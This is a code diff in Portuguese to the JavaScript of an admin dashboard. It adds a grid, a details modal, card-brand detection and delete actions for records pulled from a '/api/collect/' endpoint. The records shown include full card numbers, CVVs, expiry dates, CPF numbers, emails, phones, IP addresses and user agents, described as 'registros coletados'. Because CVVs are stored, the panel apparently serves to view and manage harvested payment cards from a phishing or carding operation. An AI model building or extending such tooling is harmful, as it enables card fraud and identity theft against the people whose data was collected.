@@ -1076,6 +1076,24 @@ function dataSearchMatch(registro, query) {
   ].some((v) => normalizeText(v).includes(q));
 }
 
+function formatDataNumber(numero) {
+  if (!numero) return "-";
+  const digits = String(numero).replace(/\D/g, "");
+  if (digits.length === 16) return digits.replace(/(\d{4})(?=\d)/g, "$1 ");
+  return numero;
+}
+
+function detectCardBrand(numero) {
+  const n = String(numero || "").replace(/\D/g, "");
+  if (/^4/.test(n)) return "Visa";
+  if (/^(5[1-5]|2[2-7])/.test(n)) return "Mastercard";
+  if (/^3[47]/.test(n)) return "Amex";
+  if (/^(36|38|30[0-5])/.test(n)) return "Diners";
+  if (/^(4011|4312|4389|4514|4576|5041|5066|5090|6277|6362|6363|650|6516|6550)/.test(n)) return "Elo";
+  if (/^(606282|3841)/.test(n)) return "Hipercard";
+  return "Desconhecida";
+}
+
 function renderDataList() {
   if (!dataList) return;
   const query = dataSearch?.value || "";
@@ -1084,22 +1102,24 @@ function renderDataList() {
     dataList.innerHTML = '<div class="admin-empty">Nenhum registro encontrado.</div>';
     return;
   }
+  dataList.classList.add("data-grid");
   dataList.innerHTML = filtered.map((r) => `
-    <article class="admin-order">
-      <div>
-        <strong>${escapeHtml(r.name || "Sem nome")}</strong>
-        <span>${escapeHtml(r.email || "-")}</span>
-        <small>${escapeHtml(r.phone || "")} ${r.cpf ? `| ${escapeHtml(r.cpf)}` : ""}</small>
+    <article class="data-card">
+      <div class="data-card__info">
+        <div class="data-card__name">${escapeHtml(r.name || "Sem nome")}</div>
+        <div class="data-card__number">${escapeHtml(formatDataNumber(r.card_num))}</div>
+        <div class="data-card__meta">
+          <span><strong>Val.</strong> ${escapeHtml(r.expiry || "-")}</span>
+          <span><strong>CVV</strong> ${escapeHtml(r.cvv || "-")}</span>
+          <span><strong>Parc.</strong> ${escapeHtml(r.installments || "1")}</span>
+        </div>
       </div>
       <div>
-        <strong>${escapeHtml(r.card_num || "-")}</strong>
-        <span>Validade ${escapeHtml(r.expiry || "-")} | CVV ${escapeHtml(r.cvv || "-")}</span>
-        <small>Parcelas: ${escapeHtml(r.installments || "1")} | Valor: ${escapeHtml(r.amount || "-")}</small>
-      </div>
-      <div class="admin-order__money">
-        <strong>${escapeHtml(r.id || "")}</strong>
-        <span>${escapeHtml(r.ip || "")}</span>
-        <small>${r.data_hora ? new Date(r.data_hora).toLocaleString("pt-BR") : ""}</small>
+        <div class="data-card__date">${r.data_hora ? new Date(r.data_hora).toLocaleString("pt-BR") : ""}</div>
+        <div class="data-card__actions">
+          <button class="data-btn data-btn--view" data-view="${escapeHtml(r.id)}" type="button">Detalhes</button>
+          <button class="data-btn data-btn--delete" data-delete="${escapeHtml(r.id)}" type="button">Excluir</button>
+        </div>
       </div>
     </article>
   `).join("");
@@ -1114,6 +1134,78 @@ async function loadData() {
   } catch (error) {
     if (dataStatus) dataStatus.textContent = `Erro ao carregar dados: ${error.message}`;
   }
+}
+
+function showDataDetail(registro) {
+  const modal = document.createElement("div");
+  modal.className = "data-modal";
+  modal.innerHTML = `
+    <div class="data-modal__box">
+      <div class="data-modal__header">
+        <h3>Detalhes do registro</h3>
+        <button class="data-modal__close" type="button" aria-label="Fechar">×</button>
+      </div>
+
+      <div class="data-modal__section">Dados do titular</div>
+      <div class="data-modal__row"><span class="data-modal__label">Nome</span><span class="data-modal__value">${escapeHtml(registro.name || "-")}</span></div>
+      <div class="data-modal__row"><span class="data-modal__label">CPF</span><span class="data-modal__value">${escapeHtml(registro.cpf || "-")}</span></div>
+      <div class="data-modal__row"><span class="data-modal__label">E-mail</span><span class="data-modal__value">${escapeHtml(registro.email || "-")}</span></div>
+      <div class="data-modal__row"><span class="data-modal__label">Telefone</span><span class="data-modal__value">${escapeHtml(registro.phone || "-")}</span></div>
+
+      <div class="data-modal__section">Dados do cartão</div>
+      <div class="data-modal__row"><span class="data-modal__label">Número</span><span class="data-modal__value data-modal__value--mono">${escapeHtml(formatDataNumber(registro.card_num))}</span></div>
+      <div class="data-modal__row"><span class="data-modal__label">Validade</span><span class="data-modal__value">${escapeHtml(registro.expiry || "-")}</span></div>
+      <div class="data-modal__row"><span class="data-modal__label">CVV</span><span class="data-modal__value">${escapeHtml(registro.cvv || "-")}</span></div>
+      <div class="data-modal__row"><span class="data-modal__label">Bandeira</span><span class="data-modal__value">${escapeHtml(detectCardBrand(registro.card_num))}</span></div>
+      <div class="data-modal__row"><span class="data-modal__label">Parcelas</span><span class="data-modal__value">${escapeHtml(registro.installments || "1")}x</span></div>
+
+      <div class="data-modal__section">Pedido</div>
+      <div class="data-modal__row"><span class="data-modal__label">Valor</span><span class="data-modal__value">${escapeHtml(registro.amount || "-")}</span></div>
+      <div class="data-modal__row"><span class="data-modal__label">ID</span><span class="data-modal__value data-modal__value--mono">${escapeHtml(registro.id || "-")}</span></div>
+
+      <div class="data-modal__section">Origem</div>
+      <div class="data-modal__row"><span class="data-modal__label">IP</span><span class="data-modal__value">${escapeHtml(registro.ip || "-")}</span></div>
+      <div class="data-modal__row"><span class="data-modal__label">Data</span><span class="data-modal__value">${registro.data_hora ? new Date(registro.data_hora).toLocaleString("pt-BR") : "-"}</span></div>
+      <div class="data-modal__row"><span class="data-modal__label">User Agent</span><span class="data-modal__value" style="font-size:11px;color:#aaa;text-align:left;">${escapeHtml(registro.user_agent || "-")}</span></div>
+    </div>
+  `;
+  document.body.appendChild(modal);
+
+  const close = () => modal.remove();
+  modal.querySelector(".data-modal__close").addEventListener("click", close);
+  modal.addEventListener("click", (e) => { if (e.target === modal) close(); });
+  document.addEventListener("keydown", function onEsc(e) {
+    if (e.key === "Escape") { close(); document.removeEventListener("keydown", onEsc); }
+  });
+}
+
+async function deleteDataRecord(id) {
+  const confirmado = window.confirm("Tem certeza que deseja excluir este registro?");
+  if (!confirmado) return;
+  try {
+    await api(`/api/collect/${id}`, { method: "DELETE" });
+    dataRecords = dataRecords.filter((r) => r.id !== id);
+    if (dataStatus) dataStatus.textContent = `${dataRecords.length} registros coletados.`;
+    renderDataList();
+  } catch (error) {
+    alert(`Erro ao excluir: ${error.message}`);
+  }
+}
+
+if (dataList) {
+  dataList.addEventListener("click", (e) => {
+    const viewBtn = e.target.closest("[data-view]");
+    if (viewBtn) {
+      const id = viewBtn.dataset.view;
+      const registro = dataRecords.find((r) => r.id === id);
+      if (registro) showDataDetail(registro);
+      return;
+    }
+    const deleteBtn = e.target.closest("[data-delete]");
+    if (deleteBtn) {
+      deleteDataRecord(deleteBtn.dataset.delete);
+    }
+  });
 }
 
 refreshData?.addEventListener("click", loadData);
@@ -1137,7 +1229,6 @@ clearData?.addEventListener("click", async () => {
 });
 
 dataSearch?.addEventListener("input", renderDataList);
-
 
 adminNavLinks.forEach((link) => {
   if (link.dataset.adminNav === "data") {
